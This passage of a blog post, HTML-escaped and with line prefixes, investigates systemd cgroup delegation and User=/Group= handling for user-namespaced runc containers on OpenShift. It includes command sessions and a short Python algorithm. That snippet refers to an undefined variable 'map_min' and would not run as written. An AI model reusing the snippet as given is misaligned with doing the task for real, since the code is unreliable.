-&lt;h2 id=&quot;determining-the-uid&quot;&gt;Determining the UID &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#determining-the-uid&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;The OCI configuration specifies the &lt;a href=&quot;https://github.com/opencontainers/runtime-spec/blob/master/config.md#posix-platform-user&quot;&gt;&lt;code&gt;user&lt;/code&gt;&lt;/a&gt; that will
-execute the container process (in the &lt;strong&gt;container’s user
-namespace&lt;/strong&gt;). It also specifies &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml&quot;&gt;&lt;code&gt;uidMappings&lt;/code&gt;&lt;/a&gt;
-between the host and container user namespaces. For example:&lt;/p&gt;
-&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;% jq -c '.process.user, .linux.uidMappings' &amp;lt; config.json
-{&amp;quot;uid&amp;quot;:0,&amp;quot;gid&amp;quot;:0}
-[{&amp;quot;containerID&amp;quot;:0,&amp;quot;hostID&amp;quot;:100000,&amp;quot;size&amp;quot;:65536}]&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt;runc&lt;/code&gt; has all the data it needs to compute the appropriate value
-for the &lt;code&gt;User=&lt;/code&gt; property. The algorithm, expressed as Python is:&lt;/p&gt;
-&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode python&quot;&gt;&lt;code class=&quot;sourceCode python&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb3-1&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;uid &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; config[&lt;span class=&quot;st&quot;&gt;&amp;quot;process&amp;quot;&lt;/span&gt;][&lt;span class=&quot;st&quot;&gt;&amp;quot;user&amp;quot;&lt;/span&gt;][&lt;span class=&quot;st&quot;&gt;&amp;quot;uid&amp;quot;&lt;/span&gt;]&lt;/span&gt;
-&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb3-2&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;/span&gt;
-&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb3-3&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;cf&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;map&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;in&lt;/span&gt; config[&lt;span class=&quot;st&quot;&gt;&amp;quot;linux&amp;quot;&lt;/span&gt;][&lt;span class=&quot;st&quot;&gt;&amp;quot;uidMappings&amp;quot;&lt;/span&gt;]:&lt;/span&gt;
-&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb3-4&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;    uid_min &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;map&lt;/span&gt;[&lt;span class=&quot;st&quot;&gt;&amp;quot;containerID&amp;quot;&lt;/span&gt;]&lt;/span&gt;
-&lt;span id=&quot;cb3-5&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb3-5&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;    uid_max &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; map_min &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;map&lt;/span&gt;[&lt;span class=&quot;st&quot;&gt;&amp;quot;size&amp;quot;&lt;/span&gt;] &lt;span class=&quot;op&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;&lt;/span&gt;
-&lt;span id=&quot;cb3-6&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb3-6&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;/span&gt;
-&lt;span id=&quot;cb3-7&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb3-7&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; uid_min &lt;span class=&quot;op&quot;&gt;&amp;lt;=&lt;/span&gt; uid &lt;span class=&quot;op&quot;&gt;&amp;lt;=&lt;/span&gt; uid_max:&lt;/span&gt;
-&lt;span id=&quot;cb3-8&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb3-8&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;        offset &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; uid &lt;span class=&quot;op&quot;&gt;-&lt;/span&gt; uid_min&lt;/span&gt;
-&lt;span id=&quot;cb3-9&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb3-9&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;cf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;map&lt;/span&gt;[&lt;span class=&quot;st&quot;&gt;&amp;quot;hostID&amp;quot;&lt;/span&gt;] &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; offset&lt;/span&gt;
-&lt;span id=&quot;cb3-10&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb3-10&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;/span&gt;
-&lt;span id=&quot;cb3-11&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb3-11&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;cf&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;
-&lt;span id=&quot;cb3-12&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb3-12&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;cf&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;pp&quot;&gt;RuntimeError&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&amp;quot;user.uid is not mapped&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h2 id=&quot;testing-with-systemd-run&quot;&gt;Testing with &lt;code&gt;systemd-run&lt;/code&gt; &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#testing-with-systemd-run&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;code&gt;systemd-run(1)&lt;/code&gt; uses the transient unit API to run programs via
-transient scope or service units. You can use the &lt;code&gt;--property&lt;/code&gt;/&lt;code&gt;-p&lt;/code&gt;
-option to pass additional properties. I used &lt;code&gt;systemd-run&lt;/code&gt; to
-observe how systemd handles the &lt;code&gt;Delegate=true&lt;/code&gt; and &lt;code&gt;User=&lt;/code&gt;
-properties.&lt;/p&gt;
-&lt;h3 id=&quot;create-and-inspect-transient-unit&quot;&gt;Create and inspect transient unit &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#create-and-inspect-transient-unit&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h3&gt;
-&lt;p&gt;First I will do a basic test, talking to my user account’s service
-manager:&lt;/p&gt;
-&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;% id -u
-1000
-
-% systemd-run --user sleep 300
-Running as unit: run-r8e3c22d2bb64491a85882d8303202dca.service
-
-% systemctl --user status run-r8e3c22d2bb64491a85882d8303202dca.service
-● run-r8e3c22d2bb64491a85882d8303202dca.service - /bin/sleep 300
-     Loaded: loaded (/run/user/1000/systemd/transient/run-r8e3c22d2bb64491a85882d8303202dca.service; transient)
-  Transient: yes
-     Active: active (running) since Wed 2021-06-09 11:31:14 AEST; 9s ago
-   Main PID: 11412 (sleep)
-      Tasks: 1 (limit: 2325)
-     Memory: 184.0K
-        CPU: 3ms
-     CGroup: /user.slice/user-1000.slice/user@1000.service/app.slice/run-r8e3c22d2bb64491a85882d8303202dca.service
-             └─11412 /bin/sleep 300
-
-Jun 09 11:31:14 f33-1.ipa.local systemd[863]: Started /bin/sleep 300.
-
-% ls -nld /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice/run-r8e3c22d2bb64491a85882d8303202dca.service
-drwxr-xr-x. 2 1000 1000 0 Jun  9 11:31 /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice/run-r8e3c22d2bb64491a85882d8303202dca.service&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;We can see that:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;systemd-run creates the transient unit&lt;/li&gt;
-&lt;li&gt;the unit was started successfully, and is running&lt;/li&gt;
-&lt;li&gt;the unit has is own &lt;code&gt;CGroup&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;the cgroup is owned by user &lt;code&gt;1000&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;As I try different ways of invoking &lt;code&gt;systemd-run&lt;/code&gt;, I will repeat
-this pattern of unit creation, inspection and cgroup ownership
-checks.&lt;/p&gt;
-&lt;h3 id=&quot;specify-user-user-service-manager&quot;&gt;Specify &lt;code&gt;User=&lt;/code&gt; (user service manager) &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#specify-user-user-service-manager&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h3&gt;
-&lt;p&gt;Next I explicity specify &lt;code&gt;User=1000&lt;/code&gt;:&lt;/p&gt;
-&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;% systemd-run --user -p User=1000 sleep 300
-Running as unit: run-r651ff7d0d1214037b70def6d5694dcd6.service
-
-% systemctl --no-pager --full --user status run-r651ff7d0d1214037b70def6d5694dcd6.service
-× run-r651ff7d0d1214037b70def6d5694dcd6.service - /bin/sleep 300
-     Loaded: loaded (/run/user/1000/systemd/transient/run-r651ff7d0d1214037b70def6d5694dcd6.service; transient)
-  Transient: yes
-     Active: failed (Result: exit-code) since Wed 2021-06-09 11:38:50 AEST; 1min 17s ago
-    Process: 11432 ExecStart=/bin/sleep 300 (code=exited, status=216/GROUP)
-   Main PID: 11432 (code=exited, status=216/GROUP)
-        CPU: 4ms
-
-Jun 09 11:38:50 f33-1.ipa.local systemd[863]: Started /bin/sleep 300.
-Jun 09 11:38:50 f33-1.ipa.local systemd[11432]: run-r651ff7d0d1214037b70def6d5694dcd6.service: Failed to determine supplementary groups: Operation not permitted
-Jun 09 11:38:50 f33-1.ipa.local systemd[11432]: run-r651ff7d0d1214037b70def6d5694dcd6.service: Failed at step GROUP spawning /bin/sleep: Operation not permitted
-Jun 09 11:38:50 f33-1.ipa.local systemd[863]: run-r651ff7d0d1214037b70def6d5694dcd6.service: Main process exited, code=exited, status=216/GROUP
-Jun 09 11:38:50 f33-1.ipa.local systemd[863]: run-r651ff7d0d1214037b70def6d5694dcd6.service: Failed with result 'exit-code'.&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;This unit failed to execute, because the user service manager does
-not have permission to determine supplementary groups. Without
-going into too much detail, this is because the user systemd
-instance lacks the &lt;code&gt;CAP_SETGID&lt;/code&gt; capability required by the
-&lt;code&gt;setgroups(2)&lt;/code&gt; system call used by &lt;code&gt;initgroups(3)&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;There doesn’t seem to be a way around this. For the rest of my
-testing I’ll talk to the system service manager. That’s okay,
-because &lt;code&gt;runc&lt;/code&gt; on OpenShift also talks to the system service
-manager.&lt;/p&gt;
-&lt;h3 id=&quot;specify-user-system-service-manager&quot;&gt;Specify &lt;code&gt;User=&lt;/code&gt; (system service manager) &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#specify-user-system-service-manager&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h3&gt;
-&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;% sudo systemd-run -p User=1000 sleep 300
-Running as unit: run-r94725453119e4003af336d7294984085.service
-
-% systemctl status run-r94725453119e4003af336d7294984085.service
-● run-r94725453119e4003af336d7294984085.service - /usr/bin/sleep 300
-     Loaded: loaded (/run/systemd/transient/run-r94725453119e4003af336d7294984085.service; transient)
-  Transient: yes
-     Active: active (running) since Wed 2021-06-09 11:50:10 AEST; 11s ago
-   Main PID: 11517 (sleep)
-      Tasks: 1 (limit: 2325)
-     Memory: 184.0K
-        CPU: 4ms
-     CGroup: /system.slice/run-r94725453119e4003af336d7294984085.service
-             └─11517 /usr/bin/sleep 300
-
-Jun 09 11:50:10 f33-1.ipa.local systemd[1]: Started /usr/bin/sleep 300.
-
-% ls -nld /sys/fs/cgroup/system.slice/run-r94725453119e4003af336d7294984085.service
-drwxr-xr-x. 2 0 0 0 Jun  9 11:50 /sys/fs/cgroup/system.slice/run-r94725453119e4003af336d7294984085.service
-
-% ps -o uid,pid,cmd --pid 11517
-  UID     PID CMD
- 1000   11517 /usr/bin/sleep 300&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;The process is running as user &lt;code&gt;1000&lt;/code&gt;, but the cgroup is owned by
-&lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
-&lt;h3 id=&quot;specify-delegatetrue&quot;&gt;Specify &lt;code&gt;Delegate=true&lt;/code&gt; &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#specify-delegatetrue&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h3&gt;
-&lt;p&gt;We need to specify &lt;code&gt;Delegate=true&lt;/code&gt; to tell systemd to delegate the
-cgroup to the specified &lt;code&gt;User&lt;/code&gt;:&lt;/p&gt;
-&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;% sudo systemd-run -p Delegate=true -p User=1000 sleep 300
-Running as unit: run-r518dbc963502423c9c67b1c72d3d4c12.service
-
-% systemctl status run-r518dbc963502423c9c67b1c72d3d4c12.service
-● run-r518dbc963502423c9c67b1c72d3d4c12.service - /usr/bin/sleep 300
-     Loaded: loaded (/run/systemd/transient/run-r518dbc963502423c9c67b1c72d3d4c12.service; transient)
-  Transient: yes
-     Active: active (running) since Wed 2021-06-09 11:59:34 AEST; 1min 21s ago
-   Main PID: 11579 (sleep)
-      Tasks: 1 (limit: 2325)
-     Memory: 184.0K
-        CPU: 3ms
-     CGroup: /system.slice/run-r518dbc963502423c9c67b1c72d3d4c12.service
-             └─11579 /usr/bin/sleep 300
-
-Jun 09 11:59:34 f33-1.ipa.local systemd[1]: Started /usr/bin/sleep 300.
-
-% ls -nld /sys/fs/cgroup/system.slice/run-r518dbc963502423c9c67b1c72d3d4c12.service
-drwxr-xr-x. 2 1000 1000 0 Jun  9 11:59 /sys/fs/cgroup/system.slice/run-r518dbc963502423c9c67b1c72d3d4c12.service&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;systemd &lt;code&gt;chown()&lt;/code&gt;ed the cgroup to the specified &lt;code&gt;User&lt;/code&gt;. Note that
-very few of the cgroup controls in the cgroup directory are
-writable by user &lt;code&gt;1000&lt;/code&gt;:&lt;/p&gt;
-&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;% ls -nl /sys/fs/cgroup/system.slice/run-r518dbc963502423c9c67b1c72d3d4c12.service \
-    |grep 1000 
--rw-r--r--. 1 1000 1000 0 Jun  9 11:59 cgroup.procs
--rw-r--r--. 1 1000 1000 0 Jun  9 11:59 cgroup.subtree_control
--rw-r--r--. 1 1000 1000 0 Jun  9 11:59 cgroup.threads&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;So the process cannot adjust its root cgroup’s &lt;code&gt;memory.max&lt;/code&gt;,
-&lt;code&gt;pids.max&lt;/code&gt;, &lt;code&gt;cpu.weight&lt;/code&gt; and so on. It &lt;em&gt;can&lt;/em&gt; create cgroup
-subtrees, manage resources within them, and move processes and
-threads among those subtrees and its root cgroup.&lt;/p&gt;
-&lt;h3 id=&quot;arbitrary-uids&quot;&gt;Arbitrary UIDs &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#arbitrary-uids&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h3&gt;
-&lt;p&gt;So far I have specified &lt;code&gt;User=1000&lt;/code&gt;. User &lt;code&gt;1000&lt;/code&gt; is a “known user”.
-That is, the Name Service Switch (see &lt;code&gt;nss(5)&lt;/code&gt;) returns information
-about the user (name, home directory, shell, etc):&lt;/p&gt;
-&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;% getent passwd $(id -u)
-ftweedal:x:1000:1000:ftweedal:/home/ftweedal:/bin/zsh&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;However, when executing containers with user namespaces, we usually
-map the namespace UIDs to unprivileged host UIDs from a &lt;em&gt;subordinate
-ID&lt;/em&gt; range. Subordinate UIDs and GID ranges are currently defined in
-&lt;code&gt;/etc/subuid&lt;/code&gt; and &lt;code&gt;/etc/subgid&lt;/code&gt; respectively. The subuid range for
-user &lt;code&gt;1000&lt;/code&gt; is:&lt;/p&gt;
-&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;% grep $(id -un) /etc/subuid
-ftweedal:100000:65536&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;User &lt;code&gt;1000&lt;/code&gt; has been allocated the range &lt;code&gt;100000&lt;/code&gt;–&lt;code&gt;165535&lt;/code&gt;. So
-let’s try &lt;code&gt;systemd-run&lt;/code&gt; with &lt;code&gt;User=100000&lt;/code&gt;:&lt;/p&gt;
-&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;% sudo systemd-run -p Delegate=true -p User=100000 sleep 300
-Running as unit: run-r1498304af7df406c9698da5c683ea79e.service
-
-% systemctl --no-pager --full status run-r1498304af7df406c9698da5c683ea79e.service
-× run-r1498304af7df406c9698da5c683ea79e.service - /usr/bin/sleep 300
-     Loaded: loaded (/run/systemd/transient/run-r1498304af7df406c9698da5c683ea79e.service; transient)
-  Transient: yes
-     Active: failed (Result: exit-code) since Wed 2021-06-09 12:32:43 AEST; 14s ago
-    Process: 11766 ExecStart=/usr/bin/sleep 300 (code=exited, status=217/USER)
-   Main PID: 11766 (code=exited, status=217/USER)
-        CPU: 2ms
-
-Jun 09 12:32:43 f33-1.ipa.local systemd[1]: Started /usr/bin/sleep 300.
-Jun 09 12:32:43 f33-1.ipa.local systemd[11766]: run-r1498304af7df406c9698da5c683ea79e.service: Failed to determine user credentials: No such process
-Jun 09 12:32:43 f33-1.ipa.local systemd[11766]: run-r1498304af7df406c9698da5c683ea79e.service: Failed at step USER spawning /usr/bin/sleep: No such process
-Jun 09 12:32:43 f33-1.ipa.local systemd[1]: run-r1498304af7df406c9698da5c683ea79e.service: Main process exited, code=exited, status=217/USER
-Jun 09 12:32:43 f33-1.ipa.local systemd[1]: run-r1498304af7df406c9698da5c683ea79e.service: Failed with result 'exit-code'.&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;It failed. Cutting the noise, the cause is:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Failed to determine user credentials: No such process&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;The string &lt;code&gt;No such process&lt;/code&gt; is a bit misleading. It is the string
-associated with the &lt;code&gt;ESRCH&lt;/code&gt; error value (see &lt;code&gt;errno(3)&lt;/code&gt;). Here it
-indicates that &lt;code&gt;getpwuid(3)&lt;/code&gt; did not find a user record for uid
-&lt;code&gt;100000&lt;/code&gt;. systemd unconditionally fails in this scenario. And this
-is a problem for us because without intervention, subordinate UIDs
-do not have associated user records.&lt;/p&gt;
-&lt;h3 id=&quot;arbitrary-uids-with-passwd-entry&quot;&gt;Arbitrary UIDs (with &lt;code&gt;passwd&lt;/code&gt; entry) &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#arbitrary-uids-with-passwd-entry&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h3&gt;
-&lt;p&gt;So let’s make NSS return something for user &lt;code&gt;100000&lt;/code&gt;. There are
-several ways we could do this, including adding it to &lt;code&gt;/etc/passwd&lt;/code&gt;,
-or creating an NSS module that generates passwd records for ranges
-declared in &lt;code&gt;/etc/subuid&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;Another way is to use &lt;a href=&quot;https://www.freedesktop.org/software/systemd/man/nss-systemd.html&quot;&gt;systemd’s NSS module&lt;/a&gt;, which
-returns passwd records for containers created by
-&lt;a href=&quot;https://www.freedesktop.org/software/systemd/man/systemd-machined.html&quot;&gt;&lt;code&gt;systemd-machined&lt;/code&gt;&lt;/a&gt;. And that’s what I did.
-Given the root filesystem for a container in &lt;code&gt;./rootfs&lt;/code&gt;,
-&lt;a href=&quot;https://www.freedesktop.org/software/systemd/man/systemd-nspawn.html&quot;&gt;&lt;code&gt;systemd-nspawn&lt;/code&gt;&lt;/a&gt; creates the container. The
-&lt;code&gt;--private-users=100000&lt;/code&gt; option tells it to create a user namespace
-mapping to the host UID &lt;code&gt;100000&lt;/code&gt; with default size 65536:&lt;/p&gt;
-&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;% sudo systemd-nspawn --directory rootfs --private-users=100000 /bin/sh
-Spawning container rootfs on /home/ftweedal/go/src/github.com/opencontainers/runc/rootfs.
-Press ^] three times within 1s to kill container.
-Selected user namespace base 100000 and range 65536.
-sh-5.0#&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;On the host we can see the “machine” via
-&lt;a href=&quot;https://www.freedesktop.org/software/systemd/man/machinectl.html&quot;&gt;&lt;code&gt;machinectl(1)&lt;/code&gt;&lt;/a&gt;. We also observe that NSS now returns
-results for UIDs in the mapped host range.&lt;/p&gt;
-&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;% getent passwd 100000 165535  
-vu-rootfs-0:x:100000:65534:UID 0 of Container rootfs:/:/usr/sbin/nologin
-
-% getent passwd 100000 165534
-vu-rootfs-0:x:100000:65534:UID 0 of Container rootfs:/:/usr/sbin/nologin
-vu-rootfs-65534:x:165534:65534:UID 65534 of Container rootfs:/:/usr/sbin/nologin&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;The &lt;code&gt;passwd&lt;/code&gt; records are constructed on demand by
-&lt;a href=&quot;https://www.freedesktop.org/software/systemd/man/nss-systemd.html&quot;&gt;&lt;code&gt;nss-systemd(8)&lt;/code&gt;&lt;/a&gt; using data registered by
-&lt;code&gt;systemd-machined&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;Now let’s try &lt;code&gt;systemd-run&lt;/code&gt; again:&lt;/p&gt;
-&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;% sudo systemd-run -p Delegate=true -p User=100000 sleep 300
-Running as unit: run-r076a82c36fcd4934b13bba47fcc8462e.service
-
-% systemctl status run-r076a82c36fcd4934b13bba47fcc8462e.service
-● run-r076a82c36fcd4934b13bba47fcc8462e.service - /usr/bin/sleep 300
-     Loaded: loaded (/run/systemd/transient/run-r076a82c36fcd4934b13bba47fcc8462e.service; transient)
-  Transient: yes
-     Active: active (running) since Wed 2021-06-09 14:14:34 AEST; 11s ago
-   Main PID: 12045 (sleep)
-      Tasks: 1 (limit: 2325)
-     Memory: 180.0K
-        CPU: 4ms
-     CGroup: /system.slice/run-r076a82c36fcd4934b13bba47fcc8462e.service
-             └─12045 /usr/bin/sleep 300
-
-Jun 09 14:14:34 f33-1.ipa.local systemd[1]: Started /usr/bin/sleep 300.
-
-% ls -nld /sys/fs/cgroup/system.slice/run-r076a82c36fcd4934b13bba47fcc8462e.service 
-drwxr-xr-x. 2 100000 65534 0 Jun  9 14:14 /sys/fs/cgroup/system.slice/run-r076a82c36fcd4934b13bba47fcc8462e.service
-
-% ps -o uid,gid,pid,cmd --pid 12045
-  UID   GID     PID CMD
-  100000 65534  12045 /usr/bin/sleep 300
-
-% id -un 65534
-nobody&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Now the cgroup is owned by &lt;code&gt;100000&lt;/code&gt;. But the group ID (&lt;code&gt;gid&lt;/code&gt;) under
-which the process runs, and the group owner of the cgroup, is
-&lt;code&gt;65534&lt;/code&gt;. This is the host’s &lt;code&gt;nobody&lt;/code&gt; account.&lt;/p&gt;
-&lt;h3 id=&quot;specify-group&quot;&gt;Specify &lt;code&gt;Group=&lt;/code&gt; &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#specify-group&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h3&gt;
-&lt;p&gt;In a user-namespaced container, ordinarily you would want both the
-user &lt;em&gt;and&lt;/em&gt; the group of the container process to be mapped into the
-user namespace. Likewise, you would expect the cgroup to be owned
-by a known (in the namespace) user. Setting the &lt;code&gt;Group=&lt;/code&gt; property
-should achieve this.&lt;/p&gt;
-&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;% sudo systemd-run -p Delegate=true -p User=100000 -p Group=100000 sleep 300      
-Running as unit: run-re610d14cc0584a37a3d4099268df75d8.service
-
-% systemctl status run-re610d14cc0584a37a3d4099268df75d8.service
-● run-re610d14cc0584a37a3d4099268df75d8.service - /usr/bin/sleep 300
-     Loaded: loaded (/run/systemd/transient/run-re610d14cc0584a37a3d4099268df75d8.service; transient)
-  Transient: yes
-     Active: active (running) since Wed 2021-06-09 14:24:58 AEST; 7s ago
-   Main PID: 12131 (sleep)
-      Tasks: 1 (limit: 2325)
-     Memory: 184.0K
-        CPU: 5ms
-     CGroup: /system.slice/run-re610d14cc0584a37a3d4099268df75d8.service
-             └─12131 /usr/bin/sleep 300
-
-Jun 09 14:24:58 f33-1.ipa.local systemd[1]: Started /usr/bin/sleep 300.
-
-% ls -nld /sys/fs/cgroup/system.slice/run-re610d14cc0584a37a3d4099268df75d8.service
-drwxr-xr-x. 2 100000 100000 0 Jun  9 14:24 /sys/fs/cgroup/system.slice/run-re610d14cc0584a37a3d4099268df75d8.service
-
-% ps -o uid,gid,pid,cmd --pid 12131
-  UID   GID     PID CMD
-100000 100000 12131 /usr/bin/sleep 300&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Finally, systemd is exhibiting the behaviour we desire.&lt;/p&gt;
-&lt;h2 id=&quot;discussion-and-next-steps&quot;&gt;Discussion and next steps &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#discussion-and-next-steps&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;In summary, the findings from this investigation are:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;systemd changes the cgroup ownership of transient units according
-to the &lt;code&gt;User=&lt;/code&gt; and &lt;code&gt;Group=&lt;/code&gt; properties, if and only if
-&lt;code&gt;Delegate=true&lt;/code&gt;.&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;systemd currently requires &lt;code&gt;User=&lt;/code&gt; and &lt;code&gt;Group=&lt;/code&gt; to refer to known
-(via NSS) users and groups.&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;Unprivileged user systemd service manager instances lack the
-privileges to set supplementary groups for the container process.
-This is not a problem for the OpenShift use case, because it uses
-the system service manager.&lt;/p&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;As to the second point, I am curious why systemd behaves this way.
-It does makes sense to query NSS to find out the shell, home
-directory, and login name for setting up the execution environment.
-But if there is no &lt;code&gt;passwd&lt;/code&gt; record, why not synthesise one with
-conservative defaults? Running processes as anonymous UIDs has a
-valid use case—increasingly so, as adoption of user namespaces
-increases. I &lt;a href=&quot;https://github.com/systemd/systemd/issues/19781&quot;&gt;filed an RFE (systemd#19781)&lt;/a&gt; against
-systemd to suggest relaxing this restriction, and inquire whether
-this is a Bad Idea for some reason I don’t yet understand.&lt;/p&gt;
-&lt;p&gt;There are some alternative approaches that don’t require changing
-systemd:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;Use &lt;code&gt;systemd-machined&lt;/code&gt; to register a machine. It provides the
-&lt;code&gt;org.freedesktop.machine1.Manager.RegisterMachine&lt;/code&gt; D-Bus method
-for this purpose. But &lt;code&gt;systemd-machined&lt;/code&gt; is not used (or even
-present) on OpenShift cluster nodes.&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;Implement, ship and configure an NSS module that synthesises
-&lt;code&gt;passwd&lt;/code&gt; records for user subordinate ID ranges. The &lt;em&gt;shadow&lt;/em&gt;
-project has &lt;a href=&quot;https://github.com/shadow-maint/shadow/pull/321&quot;&gt;defined an NSS interface&lt;/a&gt; for subid
-ranges. &lt;em&gt;libsubid&lt;/em&gt;, part of &lt;em&gt;shadow&lt;/em&gt;, will provide abstract subid
-range lookups (forward and reverse). So a &lt;em&gt;libsubid&lt;/em&gt;-based
-solution to this should be possible. Unfortunately, &lt;em&gt;libsubid&lt;/em&gt; is
-not yet widely available as a shared library.&lt;/p&gt;
-&lt;p&gt;As an example, synthetic user records could have a username like
-&lt;code&gt;subuid-{username}-{uid}&lt;/code&gt;. The home directory and shell would be
-&lt;code&gt;/&lt;/code&gt; and &lt;code&gt;/sbin/nologin&lt;/code&gt;, like the records synthesised by
-&lt;code&gt;nss-systemd&lt;/code&gt;.&lt;/p&gt;&lt;/li&gt;
